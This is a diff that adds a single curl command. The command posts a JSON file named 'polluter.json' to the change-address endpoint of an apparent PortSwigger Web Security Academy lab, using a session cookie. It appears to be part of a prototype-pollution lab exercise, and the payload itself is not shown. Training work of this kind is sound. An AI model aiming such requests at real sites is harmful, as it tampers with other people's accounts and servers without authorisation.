@@ -1,0 +1,19 @@
+curl 'https://0af000c703fae21581b2c03d005f0004.web-security-academy.net/my-account/change-address' \
+  -H 'authority: 0af000c703fae21581b2c03d005f0004.web-security-academy.net' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json;charset=UTF-8' \
+  -H 'cookie: session=uFMYwLZN1KuyB0Jf10pjzCHH4a8627ah' \
+  -H 'dnt: 1' \
+  -H 'origin: https://0af000c703fae21581b2c03d005f0004.web-security-academy.net' \
+  -H 'referer: https://0af000c703fae21581b2c03d005f0004.web-security-academy.net/my-account?id=wiener' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
+  -d @polluter.json -i -L \
+  --http1.1 \
+  -w "%{http_code}"
